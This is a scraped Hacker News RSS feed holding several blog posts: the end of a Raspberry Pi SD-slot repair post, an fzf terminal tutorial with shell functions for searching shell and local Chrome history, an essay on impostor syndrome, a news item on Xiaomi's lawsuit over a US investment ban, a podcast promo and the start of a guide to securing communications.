src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561.jpg?resize=750%2C1000&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561.jpg?resize=750%2C1000&amp;ssl=1" alt="" data-srcset="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?resize=768%2C1024&amp;ssl=1 768w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?resize=225%2C300&amp;ssl=1 225w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?resize=1600%2C2133&amp;ssl=1 1600w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?w=1920&amp;ssl=1 1920w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?w=1500&amp;ssl=1 1500w" data-sizes="(max-width: 750px) 100vw, 750px" data-recalc-dims="1" data-old-src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561.jpg?resize=750%2C1000&amp;ssl=1" data-lazy-srcset="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?resize=768%2C1024&amp;ssl=1 768w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?resize=225%2C300&amp;ssl=1 225w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?resize=1600%2C2133&amp;ssl=1 1600w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?w=1920&amp;ssl=1 1920w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561-scaled.jpg?w=1500&amp;ssl=1 1500w" data-lazy-src="https://i0.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1561.jpg?resize=750%2C1000&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>As can be seen on this image the slots have crumbled meaning they no longer hold an SD card. I managed to source the original SD card slots although the seller wanted £2 each for them which just wasn’t worthwhile. I managed to source upgraded metal SD card slots for £0.14p each on aliexpress here: <a href="https://www.aliexpress.com/item/33012711993.html" target="_blank" rel="noreferrer noopener">https://www.aliexpress.com/item/33012711993.html</a></p>



<div><p>Removing the old SD card slot was easy, using a pair of snips I cut as much of the plastic away as possible leaving only the pins to remove. I did this using a soldering iron rather than hot air. </p><p>Installing the new SD card slot was equally as easy, the new slots don’t have the SD card detection switch built in meaning that the detection pads need to be bridged with Solder as can be seen in the image below:</p></div>



<figure><img data-attachment-id="3650" data-permalink="https://blog.jmdawson.co.uk/img_1562/" data-orig-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?fit=1920%2C2560&amp;ssl=1" data-orig-size="1920,2560" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 8 Plus&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1612006273&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;100&quot;,&quot;shutter_speed&quot;:&quot;0.066666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1562" data-image-description="" data-medium-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?fit=225%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?fit=750%2C1000&amp;ssl=1" loading="lazy" width="750" height="1000" src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562.jpg?resize=750%2C1000&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562.jpg?resize=750%2C1000&amp;ssl=1" alt="" data-srcset="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?resize=768%2C1024&amp;ssl=1 768w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?resize=225%2C300&amp;ssl=1 225w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?resize=1600%2C2133&amp;ssl=1 1600w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?w=1920&amp;ssl=1 1920w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?w=1500&amp;ssl=1 1500w" data-sizes="(max-width: 750px) 100vw, 750px" data-recalc-dims="1" data-old-src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562.jpg?resize=750%2C1000&amp;ssl=1" data-lazy-srcset="https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?resize=768%2C1024&amp;ssl=1 768w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?resize=225%2C300&amp;ssl=1 225w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?resize=1600%2C2133&amp;ssl=1 1600w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?w=1920&amp;ssl=1 1920w, https://i1.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562-scaled.jpg?w=1500&amp;ssl=1 1500w" data-lazy-src="https://i2.wp.com/blog.jmdawson.co.uk/wp-content/uploads/2021/01/img_1562.jpg?resize=750%2C1000&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Raspberry Pi with the SD card slot replaced. </figcaption></figure>



<p>Overall this was a very easy repair, I will post some detailed guides or maybe even videos on the repairs once I get through some of the backlog so don’t worry if this repair wasn’t in-depth enough for you. </p>



<h2>Conclusion</h2>



<div><p>This SD card slots arriving from China allows me to repair a further 30 of the damaged Raspberry Pi’s which will be for sale soon – Remember that the profits from these sales goes to the Raspberry Pi Foundation. </p><p>The pace will be slowing down a little once this batch of repairs are complete as I have some upcoming hardware reviews I need to prepare for which will be showcased in future posts. </p></div>



<p>As always please leave a comment and share your thoughts on the repair process. </p>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/i-bought-200-raspberry-pi-model-bs-and-im-going-to-fix-them-part-4/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25972094</guid>
            <pubDate>Sat, 30 Jan 2021 19:26:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to use fzf – a terminal fuzzy finder]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25971982">thread link</a>) | @bribri
<br/>
January 30, 2021 | https://briansunter.com/blog/fzf/ | <a href="https://web.archive.org/web/*/https://briansunter.com/blog/fzf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper" data-testid="home"><main id="main"><section id="container-centre"><div><p>fzf is a terminal fuzzy finder tool that integrates nicely with many tools. These are a few of my favorite features.</p><p>Install with hombrew and source completions in <code>.zshrc</code></p><p><code>brew install fzf</code></p><p><code>$(brew --prefix)/opt/fzf/install</code></p><p>Type <code>CTRL-R</code> to search your shell history for previously used commands</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAIAAAD3FQHqAAAACXBIWXMAAAPoAAAD6AG1e1JrAAABAUlEQVQ4y2PYv2PHqiXze7ubWzoaa+rramtqasGgBsxobGxoa2vt6upqa2trbGysxQaqq6tnzJixZcsWhgWzZzdUl0eGBwaFBXj7+fp4+yADf3//kJDg8PDwkJCQgIAAH2zAy8uroLBg+vTpDE21teHB/qoqcgrKclKyMtKoQE5OTlFRUUVFRUlJCciWxgYkJSU9PT0rKysZgD4Bmg0UkiUXAPUCnVZVVcVQS7FZUlJSo2aNmjVq1iAxC5G3gRhYYoiLiwONlyQdAHUB9Xp4eFRUVDBMmzYtLy/P1dXVnVwA1JuTkzNlyhSGjRs3Tpo0qbi4uIRcUFRUNHHixPXr1wMAP4A3Xnq2960AAAAASUVORK5CYII=" alt="fzf history search" title="fzf history search" data-src="/images/blog/fzf-history.gif" width="1272" height="1020"></p><p>Just type <code>cd</code> enter without arguments to enter "interactive cd". Each folder tree is searchable.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAIAAAD3FQHqAAAACXBIWXMAAAPoAAAD6AG1e1JrAAABEElEQVQ4y+2Uu2qEUBRF71/4YlTGYH7EJ85FhSgj+QQLTeGj8RGdwoBCLASbgZAijZXYTYr8Wk45eTSxSuEq7rlszt6caqOP98v09vLcnpqnungs8iy/pqqqpmnatoW3ruv8N7IsG8dxWRb0ej5XWXp/tB3XwiY+fMWyLMdxPM9zXde27cMPMMaGYYRhOAwDOpXl8c66vWH3AsvsGJqmmStYFvS9KIqCIHAcC8q3BYCiKE3T4jhGRVFANki7tYBX1/UkSbasLWvL+kdZZVmapgkStwqe58ELtZOmKYIygx9JklAm1N8BF0EQiqJEUYSgEoMgkGVZWYWqqpIk+b7f9z2a5xkGFOPDWuCUruumafoELrE3d9WsjRYAAAAASUVORK5CYII=" alt="fzf interactive cd" title="interactive cd" data-src="/images/blog/fzf-cd.gif" width="636" height="510"></p><p>you can integrate fzf frecency search with fzf</p><pre><code><span>unalias</span> z <span><span>2</span>&gt;</span> /dev/null<br><span>z</span><span>(</span><span>)</span> <span>{</span><br>  <span>[</span> <span>$#</span> -gt <span>0</span> <span>]</span> <span>&amp;&amp;</span> fasd_cd -d <span>"<span>$*</span>"</span> <span>&amp;&amp;</span> <span>return</span><br>  <span>local</span> <span>dir</span><br>  <span>dir</span><span>=</span><span>"<span><span>$(</span>fasd -Rdl <span>"<span>$1</span>"</span> <span>|</span> fzf -1 -0 --no-sort +m<span>)</span></span>"</span> <span>&amp;&amp;</span> <span>cd</span> <span>"<span>${dir}</span>"</span> <span>||</span> <span>return</span> <span>1</span><br><span>}</span></code></pre><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAIAAAD3FQHqAAAACXBIWXMAAAPoAAAD6AG1e1JrAAABE0lEQVQ4y2M4sHvX6mULJvS0dHQ21zfW19XWIYOGhoa2ttbOzs62trbGxsY6bKC2tnbGjBmbN29mWDR3blNtRXREYGhYgK+/rw8q8PPzCw4ODgsLCwkJ8ff398EAvr6+3t7eBQUFU6dOZWhpaIgICVBXkVNSlpOWlZaSkpKGASBbRkZGUVFBWVlZUVFRVlYWWRYOJCUlPTw8ysrKGOrr64FmA4VkyQVAvZ6enuXl5aNmjZo1atYgMgtYQgELE6CQPFlAQUEBqBdY7FRUVDAACzMgS0JCAlieSJIOgLrExcXd3NxKS0sZgEVifn6+q6urG1nA3d3dxcUlOzt74sSJDBs3bgRSwIKxkFwAdEpvb+/q1asBCaM3EwaYU2IAAAAASUVORK5CYII=" alt="fzf fasd" title="fsf with fasd frecency integration" data-src="/images/blog/fzf-fasd.gif" width="636" height="510"></p><p>Just for fun you can search Google Chrome history with fzf from the terminal</p><pre><code><br><span>c</span><span>(</span><span>)</span> <span>{</span><br>  <span>local</span> cols sep google_history <span>open</span><br>  <span>cols</span><span>=</span><span><span>$((</span> COLUMNS <span>/</span> <span>3</span> <span>))</span></span><br>  <span>sep</span><span>=</span><span>'{::}'</span><p>  <span>if</span> <span>[</span> <span>"<span><span>$(</span><span>uname</span><span>)</span></span>"</span> <span>=</span> <span>"Darwin"</span> <span>]</span><span>;</span> <span>then</span><br>    <span>google_history</span><span>=</span><span>"<span>$HOME</span>/Library/Application Support/Google/Chrome/Default/History"</span><br>    <span>open</span><span>=</span>open<br>  <span>else</span><br>    <span>google_history</span><span>=</span><span>"<span>$HOME</span>/.config/google-chrome/Default/History"</span><br>    <span>open</span><span>=</span>xdg-open<br>  <span>fi</span><br>  <span>cp</span> -f <span>"<span>$google_history</span>"</span> /tmp/h<br>  sqlite3 -separator <span>$sep</span> /tmp/h <span>\</span><br>    <span>"select substr(title, 1, <span>$cols</span>), url<br>     from urls order by last_visit_time desc"</span> <span>|</span><br>  <span>awk</span> -F <span>$sep</span> <span>'{printf "%-'</span><span>$cols</span><span>'s  <span title="\x1b">\x1b</span>[36m%s<span title="\x1b">\x1b</span>[m<span title="\n">\n</span>", <span>$1</span>, <span>$2</span>}'</span> <span>|</span><br>  fzf --ansi --multi <span>|</span> <span>sed</span> <span>'s#.*\(https*://\)#<span title="\1">\1</span>#'</span> <span>|</span> <span>xargs</span> <span>$open</span> <span>&gt;</span> /dev/null <span><span>2</span>&gt;</span> /dev/null<br><span>}</span></p></code></pre><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAIAAAD3FQHqAAAACXBIWXMAAAPoAAAD6AG1e1JrAAABE0lEQVQ4y2M4sHvX6mULJvS0dHQ21zfW19XWIYOGhoa2ttbOzs62trbGxsY6bKC2tnbGjBmbN29mWDR3blNtRXREYGhYgK+/rw8q8PPzCw4ODgsLCwkJ8ff398EAvr6+3t7eBQUFU6dOZWhpaIgICVBXkVNSlpOWlZaSkpKGASBbRkZGUVFBWVlZUVFRVlYWWRYOJCUlPTw8ysrKGOrr64FmA4VkyQVAvZ6enuXl5aNmjZo1atYgMgtYQgELE6CQPFlAQUEBqBdY7FRUVDAACzMgS0JCAlieSJIOgLrExcXd3NxKS0sZgEVifn6+q6urG1nA3d3dxcUlOzt74sSJDBs3bgRSwIKxkFwAdEpvb+/q1asBCaM3EwaYU2IAAAAASUVORK5CYII=" alt="fzf chrome history" title="fsf chrome history search" data-src="/images/blog/fzf-chrome-history.gif" width="636" height="510"></p><p>You can initiate a fzf file search in the middle of a terminal command by pressing <code>CTRL-t</code> together on your keyboard. This search is recursive from your current directory.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAIAAAD3FQHqAAAACXBIWXMAAAPoAAAD6AG1e1JrAAABE0lEQVQ4y2M4sHvX6mULJvS0dHQ21zfW19XWIYOGhoa2ttbOzs62trbGxsY6bKC2tnbGjBmbN29mWDR3blNtRXREYGhYgK+/rw8q8PPzCw4ODgsLCwkJ8ff398EAvr6+3t7eBQUFU6dOZWhpaIgICVBXkVNSlpOWlZaSkpKGASBbRkZGUVFBWVlZUVFRVlYWWRYOJCUlPTw8ysrKGOrr64FmA4VkyQVAvZ6enuXl5aNmjZo1atYgMgtYQgELE6CQPFlAQUEBqBdY7FRUVDAACzMgS0JCAlieSJIOgLrExcXd3NxKS0sZgEVifn6+q6urG1nA3d3dxcUlOzt74sSJDBs3bgRSwIKxkFwAdEpvb+/q1asBCaM3EwaYU2IAAAAASUVORK5CYII=" alt="fzf ctrl-t" title="fsf ctrl-t file search" data-src="/images/blog/fzf-ctrl-t.gif" width="636" height="510"></p><ul><li><a href="https://briansunter.com/category/terminal">Terminal</a></li><li><a href="https://briansunter.com/category/bash">Bash</a></li><li><a href="https://briansunter.com/category/productivity">Productivity</a></li></ul></div></section></main></div></div>]]>
            </description>
            <link>https://briansunter.com/blog/fzf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25971982</guid>
            <pubDate>Sat, 30 Jan 2021 19:12:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Battling Impostor Syndrome]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25971977">thread link</a>) | @Jellyspice
<br/>
January 30, 2021 | https://adamlearns.com/blog/battling-impostor-syndrome | <a href="https://web.archive.org/web/*/https://adamlearns.com/blog/battling-impostor-syndrome">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Introduction</h2><p>What is impostor syndrome? It's when you doubt your skills, value, or accomplishments to the point where you feel like you don't belong (see <a href="https://en.wikipedia.org/wiki/Impostor_syndrome" target="_blank" rel="noopener noreferrer">Wikipedia</a> for more). This blog post focuses on impostor syndrome specifically in software engineering.</p><p>How do you overcome it? Easy: change your thoughts. ðŸ™ƒ</p><p>As you read, try not to push back against each and every point by identifying how it won't work for you, even if your situation truly is different somehow. The goal is to realize that you <em>do</em> provide value and that you <em>have</em> accomplished things.</p><p>I've split this into two sections:</p><ul><li>Thought experiments: these are to provide a different point of view; see if any resonate with you.</li><li>Techniques: these are specific actions that you can try.</li></ul><h2>Thought experiments</h2><h3>Apples to apples</h3><p>If you're a junior developer, comparing yourself against a senior developer is outright unfair. They may have more years in the industry, more experience with the technologies you use, etc. You may think I'm about to say "compare yourself against other junior developers", but that's still comparing apples to oranges in a way. The only person you should be comparing yourself against is the old you. That's the only person who had the exact same circumstances that you had.</p><p>Ask yourself: "am I more effective now than I was a week ago? A month ago? A year ago?" For me, at any given point in the last ~15 <em>years</em>, when I would look back at code from â‰¥1 year prior, I would almost always think of how much better I could do if I were to rework it. <em>That means that I learned!</em> That should be the focal point in your mind.</p><h3>Focus on your strengths</h3><p>The reason this blog post is targeted at software engineers is because the field is <em>huge</em>. It encompasses design, communication, planning, organization, delegation, coding, etc. You can be differing degrees of good at any subset of those areas.</p><p>Don't judge a fish by its ability to climb a tree. If you're great at refactoring systems but bad at justifying your designs during a meeting, you shouldn't focus on the weakness while forgetting about the strength entirely.</p><h3>"Onboarding impostor syndrome"</h3><p>"Onboarding impostor syndrome" is what I'm calling the specific flavor of impostor syndrome that hits when you're new to a job. You feel like you're being flooded with terms, technologies, and processes, and it's hard to feel confident when you feel like you don't have ground to stand on.</p><p>While you shouldn't expect to be operating at 100% in your first days/weeks/months on the job, you still shouldn't feel like an impostor. Just like with learning a musical instrument, improper fundamentals could lead to months or years of undoing those patterns. This means that if you <em>do</em> feel like an impostor, be careful that you're not just relying on time to overcome it. I.e. explore, ask questions, make mistakes, and set aside time for learning.</p><h3>Reverse impostor syndrome</h3><p>Other people may not even be aware that you feel like an impostor. Maybe they think you're doing a great job. Let's consider the opposite scenario: picture someone you know or work with that you think is doing well. <em>You</em> may be unknowingly instilling impostor syndrome in them. For that to even be possible, it must mean that you're doing better than you thought!</p><p>This "reverse impostor syndrome" is the biggest food for thought that I have in this section since it takes some time to unravel. For one, you'll probably never actually know who feels like an impostor, let alone whether <em>you're</em> the cause. But even stepping back to think that it's <em>possible</em> might help change your perspective.</p><h3>Ambiguity</h3><p>As you become more senior in your career, you'll have to deal with more ambiguity. It can take "small" forms like "what priority should this task be?" or larger ones like "how do we get this service up and running in the next year?" It's easy to feel like an impostor when you encounter these ambiguous problems and realize that you don't have an immediate answer for them.</p><p>Imagine if you could quantify ambiguity, e.g. before writing this post, I was at a 17 for what I wanted to say, but now that I'm almost done, I'm at about a 4. You'd be able to compare yourself <em>exactly</em> with everyone else at your job. However, we can't quantify ambiguity. For all you know, you could have the clearest picture in your mind compared to everyone around you. Impostors have a tendency to assume the oppositeâ€”that their ambiguity rating is triple what everyone else's is.</p><p>Ambiguity, by nature of <em>not</em> being concrete, cannot be dealt with directly. First, you have to make it concrete, then you can deal with it. The way one concretizes ambiguity is what's important. Talk to your co-workers about what paths they envision and try to see how they make these decisions. You may find out that your ambiguity rating isn't all that different from them.</p><h3>COVID/isolation</h3><p>(I'll make this point quickly since this will hopefully be irrelevant by 2022)</p><p>Working during isolation is not easy on people for tons of reasons, so if you can only trace your impostor syndrome to 2020/2021, then perhaps it's mostly due to isolation.</p><h3>Success is more visible than failure</h3><p>People don't tend to advertise how long something took or what their struggles were. Instead, you just see a design document or pull request that they produced and you think, "I couldn't have done that". Remember that they're just solving problems the same way that you would be solving them, and they're doing so incrementally.</p><h3>Incorrect severity</h3><p>Suppose you were to list all of your problems out to a co-worker. They might agree that some or even most of what you said are actually problems, but probably not that they're the same severity that you see them as. It's easy when you feel like an impostor to blow things out of proportion without realizing it. I think it's a defense mechanism: if the problems seem too large, then of course you couldn't be expected to solve them all! But now that you can't solve them all, you feel like you don't belong here anymoreâ€”that you're an impostor.</p><p>Try to identify which problems are "real". It's just like having to choose your battles in a friendship/relationship. Maybe writing tests takes you twice as long as everyone else on your team. Is it your biggest problem? If so, talk to your team about it. If not, try to figure out what the "real" problem is. Don't let the little issues pile up and add to your impostor syndrome.</p><h2>Techniques</h2><h3>Journal</h3><p>Journal what you're proud of. Impostor syndrome stems from an inability to internalize your own accomplishments.
If you feel like your accomplishments aren't tangible, then focus on what you've learned. Aim to write 1-3 things per day, even if they're small.</p><p>Here are some minor things that I've been proud of:</p><ul><li>I asked a question before something got out of control</li><li>I identified a potential solution to a problem</li><li>I spoke up when I felt that I should</li></ul><p>The other benefit of the journal is that it serves as a reminder when we tend to get negative. Do you remember your accomplishments from two years ago? Even when I stop to think about it, it's tough to think of which specific things I worked on or which problems I solved. With my journal, I can look back at those things to remind myself that I'm <em>not</em> an impostor.</p><h3>Mentoring</h3><p>This tip works two ways!</p><ul><li>Find a mentor: a mentor should be someone who is willing to help you. You can tell them that you're struggling with impostor syndrome, and they can help guide you through the process of overcoming it. During that time, they can potentially teach you about a wide range of things or share their own experiences.</li><li>Find a mentee: by teaching someone else, it'll help you realize that you have value to offer. It means that you've made enough progress that someone wants to learn what you have to teach.</li></ul><h3>Talk to your co-workers!</h3><p>I mentioned earlier that you shouldn't compare yourself with your co-workers, and I still assert that. However, they <em>are</em> the closest to your situation both in terms of circumstances and responsibility. Talking to them about the issues you're facing with the intent to find solutions can potentially put a dent in your negative thinking.</p><p>Here's a more specific technique that's helped me: write down <em>every</em> question you have. "What does this function do?" "How did you come up with that design decision?" "Why are we using this technology?" In asking them, you'll get one of two benefits:</p><ul><li>The answer (or redirection to someone/something that has the answer), in which case you're building more and more reasons why you're not an impostor, since now you know something more!</li><li>A realization that they don't know these things either, in which case you can ask them how they would cope with that (maybe it's not important, maybe it's more difficult than you thought, etc.).</li></ul><h3>Share your accomplishments</h3><p>This is similar to journaling in that you first need to recognize what your accomplishments are, but then keep it in mind the next time a friend asks you how you're doing. I find that small communities are great for sharing accomplishments, e.g. a small subreddit or Discord server. The people there will likely care about what you've done, encourage you, ask questions, etc.</p><h3>Identify what's worked</h3><p>Everyone is different, so you need to find out what's worked for you and then remember it.</p><p>Your impostor syndrome likely wavers a bit such that you have highs and lows:</p><ul><li>During a high, try to identify what might have caused it. Were you coding up a storm? Journaling? Exercising? Sleeping well? <strong>Write it down</strong>.</li><li>During a low, consult your notes and see what you can do to rebuild those circumstances.</li></ul><h2>Conclusion</h2><p>Impostor syndrome is insidious. It takes away from your sense of satisfaction and pride while raising your stress level. I wrote this post as much for others as I did for myself; I experienced impostor syndrome just <em>last week</em>, and I'm well into my career!</p><p>Please take some time to reflect on what you've read. If you feel empowered to work on your own impostor syndrome, then I urge you to pair action to impulse and commit to it in some way: make …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adamlearns.com/blog/battling-impostor-syndrome">https://adamlearns.com/blog/battling-impostor-syndrome</a></em></p>]]>
            </description>
            <link>https://adamlearns.com/blog/battling-impostor-syndrome</link>
            <guid isPermaLink="false">hacker-news-small-sites-25971977</guid>
            <pubDate>Sat, 30 Jan 2021 19:11:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Xiaomi to Prosecute US Government over Treasury Ban]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25971863">thread link</a>) | @sodrick
<br/>
January 30, 2021 | https://relayvibe.news/xiaomi-to-prosecute-us-government | <a href="https://web.archive.org/web/*/https://relayvibe.news/xiaomi-to-prosecute-us-government">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://relayvibes.co/tag/xiaomi">Xiaomi</a> has taken a step further to prosecute the US government on the investment ban which resists Americans from investing in the Chinese smartphone maker.</p>
<p>The U.S. Defense and Treasury Departments, is making move to take out the Xiaomi from a list of companies having affiliation with China’s military.</p>
<p>Early in the January, former US President, Donald Trump, had included the company on the Pentagon blacklist which prevents Americans from investing in the tech company. Trump had accused Xiaomi that it has strong ties with the Chinese military. This allegation was later denied. Xiaomi had tried to convince that it is not a “Communist Chinese Military Company”.</p>
<p>Now, in spite of the fact that Trump has been relieved of his office as the president, the investment ban still continues.</p>
<p>According to <a href="https://www.reuters.com/article/us-xiaomi-complaint/chinas-xiaomi-files-legal-complaint-against-u-s-defense-treasury-ban-idUSKBN29Z01A" target="_blank" rel="noopener">Reuter</a>, in the complaint, which was addressed to the new Defense Secretary, Lloyd Austin, and the Treasury Secretary, Janet Yellen, Xiaomi has expressed their grief by calling the judgment “unlawful and unconstitutional” and stressed that the company was not being controlled by the China army.</p>
<p>Challenging the ban, Xiaomi has taken the step to sue the US government. An application has now been in the bid to reverse the ban order.</p>
<p>Xiaomi had stressed, in their court filling, should the ban continues the company will face “imminent, severe, and irreparable harm”.</p>
<p>The court filing read:<br>
<em>“This action has challenges the Trump Administration’s unlawful designation on January 14, 2021, of Plaintiff Xiaomi, a consumer electronics company, as a Communist Chinese military company (“CCMC”) subject to Executive Order 13959. As a result of that designation, U.S. persons will no longer be able to purchase publicly traded Xiaomi securities or derivatives of those securities as of March 15, 2021, and must divest their holdings by January 14, 2022. As explained below, the designation of Xiaomi as a CCMC (the “Designation”) is unlawful and should be enjoined. By failing to provide a reasoned explanation for the Designation, and by making a designation decision that necessarily runs counter to any accurate evidence before the agencies, the Departments of Defense and Treasury engaged in arbitrary and capricious decision making, in violation of the Administrative Procedure Act (“APA”),”&nbsp;</em></p>
<p><em>“As relevant here, the Order prohibits transactions by any U.S. persons in publicly traded securities of certain companies that the Department of Defense, in consultation with the Department of the Treasury, designates as a “Communist Chinese military company.” President Trump amended Executive Order 13959 on January 13, 2021. Exec. Order No. 13974, 86 Fed. Reg. 4875 (Jan. 13, 2021) (attached as Ex. B). As amended, the Order provides that the prohibitions on transactions of CCMC securities or derivatives of those securities by U.S. persons take effect 60 days after a company is designated,”</em></p>
<p>Xiaomi had earlier disclosed that it been complying with US law and made a confirmation that it’s not owned, controlled or in affiliation with the Chinese military.</p>
<p>More than 70% of the Xiaomi’s voting rights, were held by the co-founders, Lin Bin and Lei Jun, and not owned or controlled by any individual or entity associated with the military.</p>

</div></div>]]>
            </description>
            <link>https://relayvibe.news/xiaomi-to-prosecute-us-government</link>
            <guid isPermaLink="false">hacker-news-small-sites-25971863</guid>
            <pubDate>Sat, 30 Jan 2021 19:00:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Evolutionary Lens]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25971825">thread link</a>) | @joubert
<br/>
January 30, 2021 | https://heatherheying.com/evolutionarylens | <a href="https://web.archive.org/web/*/https://heatherheying.com/evolutionarylens">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-animate-style="fadeinup" data-animate-group="yes" field="descr"><p>Join Heather for a weekly livestream, The Evolutionary Lens, on Bret Weinstein's <br>DarkHorse Podcast <a href="https://www.youtube.com/channel/UCi5N_uAqApEUIlg32QzkPlg">YouTube channel</a>.<br>Episodes broadcast live on Saturdays at 12:30pm Pacific, with a Q&amp;A session to follow after;<br>audio only downloads are made available on your favorite podcast catching app.</p><p>Podcast merchandise is available at the <a href="http://store.darkhorsepodcast.org/">store</a>.</p><p>Sign up below to get notified when their new book, <em></em><em>A Hunter-Gatherer's Guide to the 21st Century</em>, is available for pre-order.</p></div></div>]]>
            </description>
            <link>https://heatherheying.com/evolutionarylens</link>
            <guid isPermaLink="false">hacker-news-small-sites-25971825</guid>
            <pubDate>Sat, 30 Jan 2021 18:56:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Securing internet communications: a layman's guide]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25971640">thread link</a>) | @JNRowe
<br/>
January 30, 2021 | https://www.snoyman.com/blog/2021/01/securing-internet-communications-laymans-guide/ | <a href="https://web.archive.org/web/*/https://www.snoyman.com/blog/2021/01/securing-internet-communications-laymans-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
      <section>
        <div>
          <div>
            <div>
              <p>
                <a href="https://www.beginrust.com/">New: The "Begin Rust" book</a>
              </p>

              




  






      <p>
        <i>
          See a typo? Have a suggestion?
          <a target="_blank" rel="nofollow" href="https://github.com/snoyberg/snoyman.com/edit/master/content/blog/securing-internet-communications-laymans-guide.md">Edit this page on Github</a>
        </i>
      </p>

      



      <p>There has been rising concern over the past number of years around security in personal communications. More recently, with censorship on social media platforms occurring on a grand scale, people are wondering about securing social media platforms. I wouldn't call myself an expert on either topic, but I have good knowledge of the underlying technologies and principles, and have done some investigative work into the specific platforms for work. With many friends and family suddenly interested in this topic, I figured I would write up a layman's guide.</p>
